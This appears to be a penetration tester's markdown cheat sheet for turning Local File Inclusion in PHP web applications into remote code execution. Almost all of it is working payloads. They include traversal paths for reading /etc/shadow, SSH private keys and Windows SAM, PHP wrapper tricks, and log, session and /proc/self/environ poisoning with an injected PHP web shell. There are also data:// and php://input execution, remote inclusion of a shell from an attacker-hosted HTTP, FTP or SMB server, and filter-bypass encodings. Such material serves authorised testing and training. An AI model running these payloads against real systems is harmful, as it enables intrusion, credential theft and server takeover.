---
tags: [pentest, lfi, rce, web, initial-access]
phase: 5
---
# LFI → RCE Patterns

You found a Local File Inclusion (`?file=../../etc/passwd` works). Now escalate to RCE.

[[06 - Gaining Access/00 - README|Folder index]]

## 1. Read sensitive files first (intel)

```text
?file=../../../../etc/passwd
?file=../../../../etc/shadow                ← if readable
?file=../../../../etc/hosts
?file=../../../../etc/issue
?file=../../../../proc/self/environ
?file=../../../../proc/self/cmdline
?file=../../../../proc/self/cwd/index.php
?file=../../../../proc/self/fd/0,1,2
?file=../../../../var/log/apache2/access.log
?file=../../../../var/log/auth.log
?file=../../../../home/<user>/.ssh/id_rsa
?file=../../../../home/<user>/.bash_history
?file=../../../../var/mail/<user>
?file=../../../../var/www/html/config.php
```

Windows:

```text
?file=../../../../windows/win.ini
?file=../../../../windows/system32/drivers/etc/hosts
?file=../../../../windows/repair/SAM
?file=../../../../inetpub/wwwroot/web.config
?file=C:\Windows\System32\drivers\etc\hosts
```

## 2. PHP wrappers (read source / encoded files)

```text
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/read=string.rot13/resource=index.php
?file=php://filter/convert.iconv.utf-8.utf-16/resource=config.php
```

Decode the base64 to read PHP source - find credentials, find more files to include.

## 3. Log poisoning → RCE

Step 1: Inject PHP into a log file by setting a controlled HTTP header.

```bash
curl -A "<?php system(\$_GET['c']); ?>" http://target/anyendpoint
# Or User-Agent in any HTTP request the target server logs
```

Step 2: Include the log file via LFI.

```text
?file=../../../../var/log/apache2/access.log&c=id
?file=../../../../var/log/nginx/access.log&c=id
?file=../../../../var/log/httpd/access_log&c=id
?file=../../../../var/log/auth.log&c=id          ← SSH log; user field is loggable
```

For auth.log poisoning via SSH:

```bash
ssh '<?php system($_GET["c"]); ?>'@target        # SSH refuses login but logs the username
```

## 4. PHP session poisoning

```text
1. Find /var/lib/php/sessions/sess_<sessionid> path
2. Poison your session data: set a value that includes <?php ... ?>
   - e.g., visit /profile.php?name=<?php system($_GET['c']);?>
   - app saves "name" to $_SESSION['name']
3. Include the session file:
   ?file=../../../../var/lib/php/sessions/sess_<your-PHPSESSID>&c=id
```

## 5. /proc/self/environ poisoning

Older Linux PHP installs - your User-Agent ends up in /proc/self/environ:

```bash
curl -A "<?php system(\$_GET['c']); ?>" "http://target/?file=../../../../proc/self/environ&c=id"
```

## 6. php://input wrapper

If `allow_url_include=On`:

```bash
curl -X POST -d "<?php system('id'); ?>" "http://target/?file=php://input"
```

## 7. data:// wrapper

If `allow_url_include=On`:

```text
?file=data://text/plain,<?php system($_GET['c']); ?>&c=id
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id
```

## 8. expect:// (rare)

```text
?file=expect://id
```

(Only if expect extension loaded.)

## 9. zip:// / phar:// (file upload + LFI combo)

If you can upload a `.zip` containing a `.php` file:

```text
?file=zip:///path/to/upload.zip%23shell.php
```

Or phar:

```text
?file=phar:///path/to/upload.phar/shell.php
```

## 10. SMB UNC path (Windows + PHP)

```text
?file=\\10.10.14.5\share\shell.php
```

Host `shell.php` on an SMB server:

```bash
impacket-smbserver share /tmp/share
```

PHP fetches the remote file and executes if `allow_url_include=On`.

## 11. RFI (when allow_url_include=On)

```text
?file=http://10.10.14.5/shell.txt
?file=ftp://10.10.14.5/shell.php
```

Host `shell.txt`:

```php
<?php system($_GET['c']); ?>
```

## Filter bypasses

```text
?file=....//....//etc/passwd                ← double-dot trick
?file=..%2f..%2fetc%2fpasswd                ← URL-encoded /
?file=..%252f..%252fetc%252fpasswd          ← double-URL-encoded
?file=/etc/passwd%00                        ← null byte (PHP < 5.3.4)
?file=/etc/passwd.php                       ← filter appends .php; strip later
?file=php://filter/.../resource=/etc/passwd  ← when "../" stripped
```

If app prepends a path like `/var/www/html/uploads/$file.txt`:

```text
?file=../../../etc/passwd%00     ← if null byte works
?file=../../../etc/passwd.txt    ← if file happens to exist with .txt ext (rare)
```

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| /etc/passwd readable, source not | Try `php://filter` to read PHP source |
| Logs not includable (perms / format) | Try `/proc/self/environ`, then session poisoning |
| `allow_url_include = Off` | RFI dead. Stick with LFI + log poisoning. |
| App appends `.php` to your input | Use `php://filter/.../resource=path/to/file` - doesn't care about extension |

> [!tip] Read the source first
> Before going for RCE, use `php://filter/convert.base64-encode/resource=index.php` to read the app source. Often you'll find DB credentials, hidden endpoints, or hints that make RCE unnecessary.
